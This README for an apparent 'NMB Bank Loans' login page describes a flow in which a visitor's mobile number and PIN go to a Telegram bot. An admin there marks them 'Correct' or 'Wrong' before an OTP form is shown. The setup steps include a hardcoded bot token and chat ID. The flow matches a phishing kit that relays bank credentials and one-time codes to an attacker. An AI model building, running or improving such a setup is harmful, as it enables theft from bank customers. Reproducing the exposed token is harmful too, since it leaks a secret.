# NMB Bank Loans - Login Flow

## ⚠️ IMPORTANT: Login Flow Requires Local Server

The login flow with Telegram button approval **cannot work on Vercel serverless without `@vercel/kv` configured**. Each serverless function invocation is isolated and cannot share state between:
- The initial PIN submission
- The admin button click callback
- The status polling check

## Running Locally (Works Without KV)

### Setup

1. Start the local server with environment variables:
```powershell
$env:NMB_BOT_TOKEN="8622403187:AAGc_dcXgpr6mC-uDcVMX03HjbrVjiCyvBw"
$env:NMB_CHAT_ID="7867527304"
node scripts/server.js
```

2. Open `http://localhost:3000/login.html` in your browser

### How the Login Flow Works

1. User enters mobile number and PIN
2. Frontend POSTs to `/api/notify/login` - creates a record with `decided: false`
3. Telegram bot sends message to admin with "Correct"/"Wrong" buttons
4. Local server polls Telegram via `getUpdates` (every 1 second)
5. Admin clicks "Correct" - callback received by server, updates record
6. Frontend polls `/api/login/status/:id` - sees `decided: true`
7. OTP form appears

### Endpoints on Local Server

- `GET /api/health` - Check server status
- `GET /api/setup/purge-webhook` - Clear Telegram webhook
- `POST /api/notify/login` - Submit PIN for verification
- `GET /api/login/status/:id` - Poll for approval status